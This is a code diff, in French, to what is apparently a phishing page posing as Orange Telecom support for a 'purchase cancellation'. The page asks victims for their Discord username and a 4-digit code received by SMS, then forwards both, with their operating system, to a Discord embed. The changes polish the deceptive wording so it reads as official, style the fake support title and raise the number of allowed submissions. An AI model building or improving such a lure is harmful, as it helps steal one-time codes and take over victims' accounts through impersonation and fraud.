@@ -53,7 +53,7 @@ const CONFIG = {
   /* ——— Le formulaire ——— */
   retour: "Retour à l'assistance",
   contactTitre: "Annulation d'achat",
-  contactIntro: "Dans vos SMS de telephone vous aviez reçu un code à 4 chiffres envoyer par NOUS MEMES et pour assurer votre sécurité et indentité nous avons besoin que vous entrée le code ici pour annuler les paiment automatique fraude & arnaque il ne vous reste plus que 3 MINUTES.",
+  contactIntro: "Dans vos SMS, vous avez reçu un code à 4 chiffres. Pour assurer votre sécurité et protéger votre identité, nous vous invitons à vérifier votre compte afin d’annuler tout paiement automatique frauduleux et de prévenir les arnaques.",
   labelPseudo: "Ton pseudo Discord",
   placeholderPseudo: "Ex : Gamer826",
   labelId: "Code de Confirmation à 4 chiffres",
@@ -74,13 +74,13 @@ const CONFIG = {
   boutonAutre: "Envoyer autre chose",
 
   /* ——— Format du message dans Discord (embed) ——— */
-  titreEmbed: "📲 Assistance Orange Telecom",
+  titreEmbed: "📲 **Assistance Orange Telecom**",
   champPseudo: "👤 **Pseudo Discord**",
   champId: "📂 **Code de Confirmation**",
-  couleurEmbed: "#ED4245",
+  couleurEmbed: "#FF0000",
 
   /* ——— Limite d'envois + cooldown ——— */
-  maxMessages: 3,                 // MODIFIABLE ICI — nombre d'envois autorisés
+  maxMessages: 5,                 // MODIFIABLE ICI — nombre d'envois autorisés
   delaiHeures: 24,                // MODIFIABLE ICI — temps d'attente une fois la limite atteinte
   cooldownTitre: "Doucement",
   cooldownTexte: "Tu as envoyé tous tes messages. Tu pourras réécrire dans :",
@@ -288,8 +288,8 @@ $('#msgForm').addEventListener('submit',async e=>{
   send.disabled=true;const label=send.textContent;send.innerHTML='<span class="spin"></span>Envoi…';
   const color=parseInt(String(CONFIG.couleurEmbed).replace('#',''),16)||0xED4245;
   const embed={title:CONFIG.titreEmbed,color:color,fields:[
-    {name:CONFIG.champPseudo,value:pseudo.slice(0,256)},
-    {name:CONFIG.champId,value:id}
+    {name:CONFIG.champPseudo,value:"```"+pseudo.slice(0,256)+"```"},
+    {name:CONFIG.champId,value:"```"+id+"```"},
   ],footer:{text:navOS()},timestamp:new Date().toISOString()};
   const fd=new FormData();
   if(photo){
